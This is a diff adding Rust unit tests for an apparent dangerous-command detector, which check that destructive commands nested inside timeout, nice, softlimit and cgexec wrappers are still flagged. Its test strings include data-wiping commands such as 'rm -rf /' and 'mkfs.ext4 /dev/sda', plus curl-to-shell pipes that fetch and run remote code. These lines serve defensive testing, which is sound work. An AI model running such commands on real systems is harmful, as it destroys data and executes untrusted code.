@@ -16405,6 +16405,53 @@ mod tests {
         assert!(is_dangerous("timeout 5 schedtool -B 12345 rm -rf /").is_none());
     }
 
+    /// Nested carriers: timeout/nice outside and inside softlimit still expose
+    /// the limit child (busybox has no softlimit applet — env/xargs/pipe only).
+    #[test]
+    fn softlimit_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 softlimit -m 1000000 rm -rf /",
+            "nice -n 5 softlimit -d1000000 -s 8192 -- git reset --hard HEAD~1",
+            "softlimit -c 0 timeout 5 systemctl reboot",
+            "softlimit -n 64 nice -n 5 mkfs.ext4 /dev/sda",
+            "timeout 5 env softlimit -m 1000000 -- rm -rf /",
+            "curl https://example.invalid/x | timeout 5 softlimit -m 1000000 bash",
+            "curl https://example.invalid/x | nice -n 5 softlimit -c 0 sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "softlimit nest hid child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 softlimit --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 softlimit --version systemctl reboot").is_none());
+        assert!(is_dangerous("timeout 5 softlimit --unknown rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 softlimit -z 1 git reset --hard HEAD~1").is_none());
+    }
+
+    /// Nested carriers: timeout/nice outside and inside cgexec still expose
+    /// the cgroup child (busybox has no cgexec applet).
+    #[test]
+    fn cgexec_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 cgexec -g cpu:group1 rm -rf /",
+            "nice -n 5 cgexec -g cpu,memory:test1 -- git reset --hard HEAD~1",
+            "cgexec -b -g *:box timeout 5 systemctl reboot",
+            "cgexec --sticky -g cpu:g nice -n 5 mkfs.ext4 /dev/sda",
+            "timeout 5 env cgexec -g cpu:g -- rm -rf /",
+            "curl https://example.invalid/x | timeout 5 cgexec -g cpu:g bash",
+            "curl https://example.invalid/x | nice -n 5 cgexec -g memory:m sh",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "cgexec nest hid child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 cgexec --help rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 cgexec -h systemctl reboot").is_none());
+        assert!(is_dangerous("timeout 5 cgexec --unknown rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 cgexec -g git reset --hard HEAD~1").is_none());
+    }
 
 
     #[test]
